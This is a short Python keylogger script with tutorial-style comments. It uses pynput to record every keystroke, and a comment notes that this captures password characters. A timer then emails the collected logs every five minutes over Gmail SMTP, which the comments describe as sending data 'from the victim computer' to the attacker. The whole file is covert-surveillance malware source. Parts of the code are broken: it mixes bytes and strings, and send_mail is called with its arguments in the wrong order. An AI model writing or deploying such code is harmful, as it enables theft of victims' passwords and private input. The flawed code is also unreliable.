import pynput.keyboard
import smtplib
import threading

logs = "" 

def callback(key):
    global logs 
    try:
        logs = logs + key.char.encode("utf-8")
#adding this encode will cover all special characters as well which are available in passwords mostly.
    except AttributeError:
        if key == key.space:
            logs = logs + " "
        else:
            logs = logs + str(key)

#now I want to send this info to the hacker computer from the victim computer.
def send_mail(email1,email2,password,message):
    emailserver = smtplib.SMTP("smtp.gmail.com",587)
    #here we trying to connect with gmail..and 587 is default port for gmail
    #Now we want our script to connect to that address...so we start this email server
    emailserver.starttls()
    #now give your login info
    emailserver.login(email1,password)
    emailserver.sendmail(email1,email2,message)
    emailserver.quit()
   
#now I want to send this info to the hacker computer from the victim computer.   
#for this we'll do threading for smooth flow of these functions with each other
def thread_function():
    global logs
    send_mail("email","password",logs,"")
    #this will send the logs to attacker website, and then clear the log string for new input
    logs = ""
    timer_obj = threading.Timer(300,thread_function)
    #we are putting a timer of 5 minutes...so it will send fresh logs every 5 minutes
    timer_obj.start()

   
keylogger_listener = pynput.keyboard.Listener(on_press=callback)   
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
    

    
